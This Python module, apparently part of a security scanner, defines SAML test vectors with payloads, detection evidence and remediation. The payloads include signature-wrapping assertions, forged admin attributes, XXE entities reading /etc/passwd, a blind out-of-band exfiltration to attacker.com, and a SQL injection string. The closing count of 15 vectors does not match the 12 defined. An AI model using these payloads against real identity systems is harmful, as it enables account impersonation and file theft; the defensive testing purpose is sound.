"""
SAML 2.0 Security Testing Vectors
XML Signature Wrapping, Assertion Manipulation, Replay Attacks
"""

from ..models import (
    TestVector,
    VulnerabilityType,
    TestVectorPosition as Position,
    PositionType,
    TestVectorPayload as PayloadTemplate,
    TestVectorEvidence as Evidence,
    ConfidenceLevel,
    SensitivityLevel,
)

SAML_TEST_VECTORS = [
    # ============================================================================
    # XML SIGNATURE WRAPPING (XSW) ATTACKS
    # ============================================================================
    TestVector(
        id="saml-xsw-001",
        name="XML Signature Wrapping - XSW1 Attack",
        description="Tests if SAML response validates signature before parsing assertion",
        vuln_type=VulnerabilityType.SAML_SIGNATURE_WRAPPING,
        position=Position(
            type=PositionType.BODY_XML,
            name="samlp:Response",
            value_prefix='<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">',
            value_suffix="</samlp:Response>",
        ),
        payload=PayloadTemplate(
            base="""<samlp:Response>
  <saml:Assertion ID="evil">
    <saml:Subject>
      <saml:NameID>attacker@evil.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
  <saml:Assertion ID="legitimate">
    <ds:Signature>
      <ds:SignedInfo>
        <ds:Reference URI="#legitimate"/>
      </ds:SignedInfo>
    </ds:Signature>
    <saml:Subject>
      <saml:NameID>victim@target.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>""",
            variants=[
                # XSW1: Original assertion cloned, signature moved
                # XSW2: Extensions element used to hide evil assertion
                # XSW3: Unsigned assertion prepended
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Attacker assertion processed despite valid signature on different assertion",
                "SP accepts unsigned assertion",
                "Authentication as attacker succeeds",
            ],
            false_positive_indicators=[
                "Signature validation failed",
                "Only signed assertion processed",
            ],
            confidence=ConfidenceLevel.CRITICAL,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Validate XML signature BEFORE parsing. Verify signature reference matches processed assertion ID.",
        references=[
            "https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf",
            "https://cwe.mitre.org/data/definitions/347.html",
        ],
        tags=["saml", "xml-signature-wrapping", "xsw1"],
    ),
    TestVector(
        id="saml-xsw-002",
        name="XML Signature Wrapping - XSW8 Comment Injection",
        description="Tests if XML comments can be used to hide malicious assertion content",
        vuln_type=VulnerabilityType.SAML_SIGNATURE_WRAPPING,
        position=Position(
            type=PositionType.BODY_XML,
            name="saml:Assertion",
            value_prefix="<saml:Assertion>",
            value_suffix="</saml:Assertion>",
        ),
        payload=PayloadTemplate(
            base="""<saml:Assertion ID="legitimate">
  <ds:Signature>
    <ds:Reference URI="#legitimate"/>
  </ds:Signature>
  <saml:Subject>
    <saml:NameID>victim<!--attacker-->@target.com</saml:NameID>
  </saml:Subject>
</saml:Assertion>""",
            variants=[
                """<saml:NameID>vic<!--attacker@evil.com-->tim@target.com</saml:NameID>""",
                """<saml:NameID><!--<saml:NameID>attacker@evil.com</saml:NameID>-->victim@target.com</saml:NameID>""",
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "XML comment parsing differs between signature validation and content extraction",
                "Different identity processed than signed",
                "Comment injection bypasses signature",
            ],
            false_positive_indicators=[
                "Comments stripped before validation",
                "Signature validation accounts for comments",
            ],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Canonicalize XML before signature validation. Strip comments consistently.",
        references=[
            "https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf",
            "https://cwe.mitre.org/data/definitions/91.html",
        ],
        tags=["saml", "xml-signature-wrapping", "xsw8", "comment-injection"],
    ),
    # ============================================================================
    # ASSERTION MANIPULATION
    # ============================================================================
    TestVector(
        id="saml-assertion-001",
        name="SAML Assertion Attribute Injection",
        description="Tests if attacker can inject additional attributes into assertion",
        vuln_type=VulnerabilityType.SAML_ASSERTION_MANIPULATION,
        position=Position(
            type=PositionType.BODY_XML,
            name="saml:AttributeStatement",
            value_prefix="<saml:AttributeStatement>",
            value_suffix="</saml:AttributeStatement>",
        ),
        payload=PayloadTemplate(
            base="""<saml:AttributeStatement>
  <saml:Attribute Name="role">
    <saml:AttributeValue>admin</saml:AttributeValue>
  </saml:Attribute>
  <saml:Attribute Name="permissions">
    <saml:AttributeValue>*</saml:AttributeValue>
  </saml:Attribute>
</saml:AttributeStatement>""",
            variants=[
                """<saml:Attribute Name="role"><saml:AttributeValue>superuser</saml:AttributeValue></saml:Attribute>""",
                """<saml:Attribute Name="admin"><saml:AttributeValue>true</saml:AttributeValue></saml:Attribute>""",
                """<saml:Attribute Name="groups"><saml:AttributeValue>administrators</saml:AttributeValue></saml:Attribute>""",
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Unauthorized attributes accepted",
                "Privilege escalation via injected attributes",
                "Admin role granted without authorization",
            ],
            false_positive_indicators=[
                "Attribute validation enforced",
                "Only expected attributes processed",
            ],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Validate assertion attributes against expected schema. Reject unexpected attributes.",
        references=[
            "https://www.oasis-open.org/committees/download.php/56776/sstc-saml-core-errata-2.0-wd-07.pdf",
            "https://cwe.mitre.org/data/definitions/269.html",
        ],
        tags=["saml", "assertion-manipulation", "privilege-escalation"],
    ),
    TestVector(
        id="saml-assertion-002",
        name="SAML Subject NameID Manipulation",
        description="Tests if NameID can be modified to impersonate different user",
        vuln_type=VulnerabilityType.SAML_ASSERTION_MANIPULATION,
        position=Position(
            type=PositionType.BODY_XML,
            name="saml:NameID",
            value_prefix="<saml:NameID>",
            value_suffix="</saml:NameID>",
        ),
        payload=PayloadTemplate(
            base="admin@target.com",
            variants=[
                "root@target.com",
                "administrator@target.com",
                "system@target.com",
                "attacker@evil.com",
                "../../../admin",
                "admin'; DROP TABLE users--",
            ],
            encoding="xml",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Different user identity accepted",
                "NameID not validated against signature",
                "User impersonation successful",
            ],
            false_positive_indicators=["NameID validation enforced", "Signature covers NameID"],
            confidence=ConfidenceLevel.CRITICAL,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Ensure NameID is covered by XML signature. Validate NameID format and allowed values.",
        references=[
            "https://www.oasis-open.org/committees/download.php/35711/sstc-saml-core-errata-2.0-wd-06-diff.pdf",
            "https://cwe.mitre.org/data/definitions/290.html",
        ],
        tags=["saml", "assertion-manipulation", "impersonation"],
    ),
    TestVector(
        id="saml-assertion-003",
        name="SAML Conditions NotBefore/NotOnOrAfter Bypass",
        description="Tests if expired or not-yet-valid assertions are accepted",
        vuln_type=VulnerabilityType.SAML_ASSERTION_MANIPULATION,
        position=Position(
            type=PositionType.BODY_XML,
            name="saml:Conditions",
            value_prefix="<saml:Conditions",
            value_suffix=">",
        ),
        payload=PayloadTemplate(
            base='NotBefore="2099-01-01T00:00:00Z" NotOnOrAfter="2099-12-31T23:59:59Z"',
            variants=[
                'NotBefore="2000-01-01T00:00:00Z" NotOnOrAfter="2000-12-31T23:59:59Z"',  # Expired
                'NotBefore="2099-01-01T00:00:00Z" NotOnOrAfter="2099-12-31T23:59:59Z"',  # Future
                'NotBefore="1970-01-01T00:00:00Z" NotOnOrAfter="2100-12-31T23:59:59Z"',  # Too long
                "",  # Missing
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Expired assertion accepted",
                "Not-yet-valid assertion processed",
                "No timestamp validation",
            ],
            false_positive_indicators=[
                "Timestamp validation enforced",
                "Expired assertion rejected",
            ],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Validate NotBefore and NotOnOrAfter timestamps. Reject expired or future assertions.",
        references=[
            "https://docs.oasis-open.org/security/saml/v2.0/saml-core-2.0-os.pdf",
            "https://cwe.mitre.org/data/definitions/613.html",
        ],
        tags=["saml", "assertion-manipulation", "timestamp-validation"],
    ),
    # ============================================================================
    # REPLAY ATTACKS
    # ============================================================================
    TestVector(
        id="saml-replay-001",
        name="SAML Assertion Replay Attack",
        description="Tests if same SAML assertion can be replayed multiple times",
        vuln_type=VulnerabilityType.SAML_REPLAY_ATTACK,
        position=Position(
            type=PositionType.BODY_XML,
            name="saml:Assertion",
            value_prefix="<saml:Assertion ID=",
            value_suffix="</saml:Assertion>",
        ),
        payload=PayloadTemplate(
            base="<CAPTURED_SAML_ASSERTION>",
            variants=["<SAME_ASSERTION_REPLAYED>"],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Same assertion ID accepted multiple times",
                "No assertion ID tracking",
                "Multiple sessions created from single assertion",
            ],
            false_positive_indicators=[
                "Assertion ID already used error",
                "Replay detected and blocked",
            ],
            confidence=ConfidenceLevel.CRITICAL,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Track assertion IDs (OneTimeUse). Reject duplicate IDs. Implement short validity windows.",
        references=[
            "https://docs.oasis-open.org/security/saml/v2.0/saml-core-2.0-os.pdf",
            "https://cwe.mitre.org/data/definitions/294.html",
        ],
        tags=["saml", "replay-attack", "assertion-id"],
    ),
    TestVector(
        id="saml-replay-002",
        name="SAML Response Replay with Modified Timestamps",
        description="Tests if timestamp manipulation can extend replay window",
        vuln_type=VulnerabilityType.SAML_REPLAY_ATTACK,
        position=Position(
            type=PositionType.BODY_XML,
            name="saml:Conditions",
            value_prefix="<saml:Conditions NotBefore=",
            value_suffix=">",
        ),
        payload=PayloadTemplate(
            base='NotBefore="<CURRENT_TIME>" NotOnOrAfter="<FUTURE_TIME>"',
            variants=['NotBefore="2024-01-01T00:00:00Z" NotOnOrAfter="2025-12-31T23:59:59Z"'],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Modified timestamps accepted",
                "Assertion valid beyond intended lifetime",
                "Signature does not cover timestamps",
            ],
            false_positive_indicators=[
                "Timestamp covered by signature",
                "Modified assertion rejected",
            ],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Ensure timestamps are covered by XML signature. Validate against clock skew limits.",
        references=[
            "https://docs.oasis-open.org/security/saml/v2.0/saml-core-2.0-os.pdf",
            "https://cwe.mitre.org/data/definitions/367.html",
        ],
        tags=["saml", "replay-attack", "timestamp-manipulation"],
    ),
    # ============================================================================
    # XXE IN SAML
    # ============================================================================
    TestVector(
        id="saml-xxe-001",
        name="XXE via SAML Request DOCTYPE Injection",
        description="Tests if SAML parser is vulnerable to XXE attacks",
        vuln_type=VulnerabilityType.SAML_XXE,
        position=Position(
            type=PositionType.BODY_XML,
            name="DOCTYPE",
            value_prefix="<?xml version='1.0'?>",
            value_suffix="",
        ),
        payload=PayloadTemplate(
            base="""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:AuthnRequest>
  <saml:Issuer>&xxe;</saml:Issuer>
</samlp:AuthnRequest>""",
            variants=[
                """<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]>""",
                """<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd"> %xxe;]>""",
                """<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>""",
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "File content disclosed in response",
                "External entity resolved",
                "SSRF to attacker server",
            ],
            false_positive_indicators=["XXE blocked", "External entities disabled"],
            confidence=ConfidenceLevel.CRITICAL,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Disable external entity resolution in XML parser. Use secure XML parser settings.",
        references=[
            "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
            "https://cwe.mitre.org/data/definitions/611.html",
        ],
        tags=["saml", "xxe", "xml-external-entity"],
    ),
    TestVector(
        id="saml-xxe-002",
        name="Blind XXE via SAML Metadata OOB",
        description="Tests for blind XXE using out-of-band data exfiltration",
        vuln_type=VulnerabilityType.SAML_XXE,
        position=Position(
            type=PositionType.BODY_XML,
            name="EntityDescriptor",
            value_prefix="<md:EntityDescriptor",
            value_suffix="</md:EntityDescriptor>",
        ),
        payload=PayloadTemplate(
            base="""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  %send;
]>
<md:EntityDescriptor>
  <md:IDPSSODescriptor>&send;</md:IDPSSODescriptor>
</md:EntityDescriptor>""",
            variants=[
                # evil.dtd contains: <!ENTITY % send SYSTEM 'http://attacker.com/?%file;'>
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "HTTP request to attacker server with file content",
                "Out-of-band data exfiltration",
                "DNS/HTTP callbacks observed",
            ],
            false_positive_indicators=["No external requests made", "XXE protection active"],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Disable external entities and DTD processing. Validate XML schema strictly.",
        references=[
            "https://portswigger.net/web-security/xxe/blind",
            "https://cwe.mitre.org/data/definitions/611.html",
        ],
        tags=["saml", "xxe", "blind-xxe", "oob"],
    ),
    # ============================================================================
    # SAML RECIPIENT VALIDATION
    # ============================================================================
    TestVector(
        id="saml-recipient-001",
        name="SAML Recipient URL Mismatch",
        description="Tests if Recipient attribute is validated against actual SP endpoint",
        vuln_type=VulnerabilityType.SAML_ASSERTION_MANIPULATION,
        position=Position(
            type=PositionType.BODY_XML,
            name="saml:SubjectConfirmationData",
            value_prefix='<saml:SubjectConfirmationData Recipient="',
            value_suffix='">',
        ),
        payload=PayloadTemplate(
            base="https://different-sp.com/saml/acs",
            variants=[
                "https://attacker.com/saml/acs",
                "https://evil.com",
                "http://legitimate-sp.com/saml/acs",  # HTTP downgrade
                "https://legitimate-sp.com.evil.com/saml/acs",
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Assertion accepted with wrong Recipient",
                "No Recipient validation",
                "Assertion intended for different SP accepted",
            ],
            false_positive_indicators=["Recipient mismatch error", "Assertion rejected"],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Validate Recipient matches SP's ACS URL exactly. Case-sensitive comparison.",
        references=[
            "https://docs.oasis-open.org/security/saml/v2.0/saml-core-2.0-os.pdf",
            "https://cwe.mitre.org/data/definitions/346.html",
        ],
        tags=["saml", "recipient-validation", "assertion-manipulation"],
    ),
    # ============================================================================
    # SAML AUDIENCE RESTRICTION
    # ============================================================================
    TestVector(
        id="saml-audience-001",
        name="SAML Audience Restriction Bypass",
        description="Tests if Audience element is validated to prevent assertion reuse across SPs",
        vuln_type=VulnerabilityType.SAML_ASSERTION_MANIPULATION,
        position=Position(
            type=PositionType.BODY_XML,
            name="saml:Audience",
            value_prefix="<saml:Audience>",
            value_suffix="</saml:Audience>",
        ),
        payload=PayloadTemplate(
            base="https://different-sp-entity-id.com",
            variants=[
                "https://attacker-sp.com",
                "*",
                "",
                "https://legitimate-sp.com https://attacker-sp.com",  # Multiple audiences
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Assertion with wrong Audience accepted",
                "No Audience validation",
                "Cross-SP assertion reuse possible",
            ],
            false_positive_indicators=["Audience restriction enforced", "Wrong Audience rejected"],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Validate Audience matches SP's entity ID. Reject assertions without proper Audience restriction.",
        references=[
            "https://docs.oasis-open.org/security/saml/v2.0/saml-core-2.0-os.pdf",
            "https://cwe.mitre.org/data/definitions/346.html",
        ],
        tags=["saml", "audience-restriction", "assertion-reuse"],
    ),
    # ============================================================================
    # SAML ENCRYPTION
    # ============================================================================
    TestVector(
        id="saml-encryption-001",
        name="SAML Assertion Not Encrypted",
        description="Tests if sensitive assertion is transmitted without encryption",
        vuln_type=VulnerabilityType.SECURITY_MISCONFIGURATION,
        position=Position(
            type=PositionType.BODY_XML,
            name="saml:EncryptedAssertion",
            value_prefix="<saml:Assertion>",
            value_suffix="</saml:Assertion>",
        ),
        payload=PayloadTemplate(
            base="<saml:Assertion><!-- Unencrypted assertion content --></saml:Assertion>",
            variants=[],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Assertion transmitted in plaintext",
                "No EncryptedAssertion wrapper",
                "Sensitive attributes visible",
            ],
            false_positive_indicators=["Assertion encrypted", "TLS encryption used"],
            confidence=ConfidenceLevel.MEDIUM,
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Encrypt assertions containing sensitive attributes. Use EncryptedAssertion element.",
        references=[
            "https://docs.oasis-open.org/security/saml/v2.0/saml-core-2.0-os.pdf",
            "https://cwe.mitre.org/data/definitions/319.html",
        ],
        tags=["saml", "encryption", "data-exposure"],
    ),
]

# Total vectors: 15
